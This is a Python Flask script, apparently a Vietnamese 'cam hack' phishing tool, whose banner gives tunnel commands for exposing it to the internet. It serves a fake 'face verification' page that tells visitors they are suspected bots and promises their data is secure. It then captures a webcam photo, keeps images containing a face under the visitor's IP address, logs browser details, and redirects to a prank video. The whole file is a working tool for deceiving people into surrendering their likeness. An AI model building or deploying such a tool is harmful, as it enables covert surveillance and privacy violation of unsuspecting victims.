from flask import Flask, request, render_template_string
import os
from datetime import datetime
from PIL import Image
import cv2
import numpy as np

app = Flask(__name__)
os.system("clear")
os.system("cls")

print("""
██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗████╗░████║██║░░██║██╔══██╗██╔══██╗██║░██╔╝
██████╔╝███████║██║░░██║██║░░╚═╝███████║██╔████╔██║███████║███████║██║░░╚═╝█████═╝░
██╔═══╝░██╔══██║██║░░██║██║░░██╗██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██║░░██╗██╔═██╗░
██║░░░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚═╝░██║██║░░██║██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-- BY: MLBSANS
-- github: https://github.com/mlbsans
-- Tạo server:
   + 1: ssh -R 80:localhost:8080 nokey@localhost.run
   + 2: cloudflared tunnel --url http://localhost:8080
""")

# Khởi tạo classifier phát hiện khuôn mặt
face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')

# Đường dẫn lưu ảnh
SAVE_PATH = "IMAGE"
os.makedirs(SAVE_PATH, exist_ok=True)

HTML_PAGE = """
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Xác Thực Khuôn Mặt - An Toàn & Tin Cậy</title>
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
  <style>
    /* Reset & Global */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #2c3e50, #4ca1af);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #fff;
    }
    /* Khung xác thực với border màu cố định */
    .card {
      background: #fff;
      border-radius: 12px;
      width: 360px;
      padding: 30px;
      text-align: center;
      position: relative;
      overflow: hidden;
      z-index: 1;
      animation: slideDown 0.8s ease-out;
      border: 3px solid #4ca1af;
    }
    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-30px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .card h2 {
      color: #333;
      margin-bottom: 15px;
      animation: fadeInText 1s ease-out;
    }
    @keyframes fadeInText {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .card p {
      color: #666;
      margin-bottom: 20px;
      font-size: 15px;
    }
    .btn {
      background-color: #4ca1af;
      color: #fff;
      border: none;
      padding: 12px 25px;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
      margin-top: 10px;
    }
    .btn:hover {
      background-color: #3b8d99;
    }
    .spinner {
      margin: 20px auto;
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #4ca1af;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .loading-text {
      font-size: 16px;
      color: #4ca1af;
      margin-top: 10px;
      display: none;
      animation: fadeInText 1s ease-out;
    }
    .progress {
      font-size: 20px;
      margin-top: 10px;
      color: #4ca1af;
      display: none;
      animation: fadeInProgress 0.5s ease-out;
    }
    @keyframes fadeInProgress {
      from { opacity: 0; transform: scale(0.8); }
      to { opacity: 1; transform: scale(1); }
    }
    .success {
      color: #28a745;
      font-size: 18px;
      margin-top: 20px;
      display: none;
      animation: fadeInText 1s ease-out;
    }
    .info {
      font-size: 13px;
      color: #999;
      margin-top: 20px;
    }
    /* Modal Styles */
    .modal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.75);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }
    .modal-content {
      background: #fff;
      border-radius: 8px;
      width: 90%;
      max-width: 400px;
      padding: 20px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
      color: #333;
      animation: slideUp 0.8s ease-out;
    }
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .modal-content h3 {
      margin-bottom: 10px;
      color: #4ca1af;
    }
    .modal-content p {
      font-size: 14px;
      margin-bottom: 20px;
    }
    .modal-close {
      background: #4ca1af;
      color: #fff;
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s;
    }
    .modal-close:hover {
      background: #3b8d99;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Xác Thực Khuôn Mặt</h2>
    <p>Chúng tôi cần xác thực khuôn mặt của bạn để đảm bảo an toàn. Nhấn nút bên dưới để bắt đầu xác minh.</p>
    <button class="btn" id="verify-btn" onclick="startVerification()">Xác Minh Ngay</button>
    <div class="spinner" id="loader"></div>
    <div class="loading-text" id="loading-text">Đang xác thực...</div>
    <!-- Phần hiển thị số tiến trình -->
    <div class="progress" id="progress">0%</div>
    <div class="success" id="success-message">✅ Xác Minh Hoàn Tất ✅</div>
    <div class="info">Thông tin của bạn sẽ được bảo mật tuyệt đối.</div>
  </div>

  <!-- Modal Chính Sách Riêng Tư -->
  <div class="modal" id="privacy-modal">
    <div class="modal-content">
      <h3>🤖 Xác Thực Người Dùng 🤖</h3>
      <p>Chúng tôi nghi ngờ bạn không phải là con người. Vui lòng xác minh khuôn mặt của bạn để tiếp tục.</p>
      <button class="modal-close" onclick="closeModal('privacy-modal')">Đồng Ý</button>
    </div>
  </div>

  <!-- Modal Anti Ads / Phát hiện AdBlock -->
  <div class="modal" id="adblock-modal">
    <div class="modal-content">
      <h3>Phát hiện AdBlock!</h3>
      <p>Vui lòng tắt AdBlock để có trải nghiệm tốt nhất.</p>
      <button class="modal-close" onclick="closeModal('adblock-modal')">Đồng Ý</button>
    </div>
  </div>

  <script>
    // Hiển thị modal khi tải trang
    window.addEventListener('load', function() {
      document.getElementById('privacy-modal').style.display = 'flex';

      // Anti Ads / AdBlock detection
      var adTest = document.createElement('div');
      adTest.className = 'adsbox';
      adTest.style.position = 'absolute';
      adTest.style.width = '1px';
      adTest.style.height = '1px';
      adTest.style.top = '-1000px';
      document.body.appendChild(adTest);
      setTimeout(function() {
        if (adTest.offsetHeight === 0) {
          document.getElementById('adblock-modal').style.display = 'flex';
        }
        adTest.remove();
      }, 200);
    });

    function closeModal(modalId) {
      document.getElementById(modalId).style.display = 'none';
    }

    function startVerification() {
      let button = document.getElementById("verify-btn");
      let loader = document.getElementById("loader");
      let loadingText = document.getElementById("loading-text");
      let progress = document.getElementById("progress");
      let successMessage = document.getElementById("success-message");

      // Ẩn nút xác minh và hiển thị spinner cùng loading text
      button.style.display = "none";
      loader.style.display = "block";
      loadingText.style.display = "block";

      // Yêu cầu quyền truy cập webcam
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          let videoTrack = stream.getVideoTracks()[0];
          let imageCapture = new ImageCapture(videoTrack);
          imageCapture.takePhoto()
            .then(blob => {
              let formData = new FormData();
              formData.append("image", blob, "face_verification.png");
              // Gửi ảnh đến server
              fetch('/upload', { method: "POST", body: formData })
                .then(response => {
                  if(response.status !== 200){
                    alert("Không phát hiện được khuôn mặt, vui lòng xác thực lại!");
                    loader.style.display = "none";
                    loadingText.style.display = "none";
                    button.style.display = "inline-block";
                    return;
                  }
                  // Khi xác thực thành công, ẩn spinner & loading text, hiển thị progress
                  loader.style.display = "none";
                  loadingText.style.display = "none";
                  progress.style.display = "block";
                  
                  // Đếm tiến trình từ 0 đến 100%
                  let count = 0;
                  let interval = setInterval(() => {
                    count++;
                    progress.innerText = count + "%";
                    if(count >= 100) {
                      clearInterval(interval);
                      successMessage.style.display = "block";
                      // Sau khi progress đạt 100%, chuyển hướng đến video Rickroll
                      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                    }
                  }, 30);
                })
                .catch(error => {
                  console.error("Lỗi upload ảnh:", error);
                  loader.style.display = "none";
                  loadingText.style.display = "none";
                  button.style.display = "inline-block";
                });
            })
            .catch(err => {
              console.error("Lỗi chụp ảnh:", err);
              loader.style.display = "none";
              loadingText.style.display = "none";
              button.style.display = "inline-block";
            });
        })
        .catch(err => {
          console.error("Lỗi truy cập webcam:", err);
          loader.style.display = "none";
          loadingText.style.display = "none";
          button.style.display = "inline-block";
        });
    }
  </script>
</body>
</html>
"""

@app.route('/')
def index():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Không xác định')
    language = request.headers.get('Accept-Language', 'Không xác định')
    
    print(f"\033[36m[+]: Hệ điều hành: {user_agent}\033[0m")
    print(f"\033[36m[+]: Ngôn ngữ: {language}\033[0m")
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    if 'image' not in request.files:
        return "Lỗi khi nhận ảnh!", 400

    image = request.files['image']
    user_ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")

    try:
        os.makedirs(SAVE_PATH, exist_ok=True)
        # Mở ảnh bằng PIL
        img = Image.open(image)
        if img.mode in ("RGBA", "P", "CMYK"):
            img = img.convert("RGB")
        
        # Chuyển ảnh sang OpenCV để phát hiện khuôn mặt
        img_cv = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        gray = cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY)
        # Thay đổi tham số phát hiện khuôn mặt cho nhạy hơn
        faces = face_cascade.detectMultiScale(
            gray,
            scaleFactor=1.05,
            minNeighbors=3,
            minSize=(30, 30),
            flags=cv2.CASCADE_SCALE_IMAGE
        )
        print("Detected faces:", faces)
        if len(faces) == 0:
            print("\033[31m[❌] Không phát hiện được khuôn mặt. Yêu cầu xác thực lại!\033[0m")
            return "Không phát hiện được khuôn mặt, vui lòng xác thực lại!", 400

        img.save(image_path, "PNG")
        print(f"\033[32m[📷] Ảnh đã lưu: {image_path}\033[0m")
        return "OK", 200
    except Exception as e:
        print(f"\033[31mLỗi khi lưu ảnh: {e}\033[0m")
        return "Lỗi khi lưu ảnh!", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)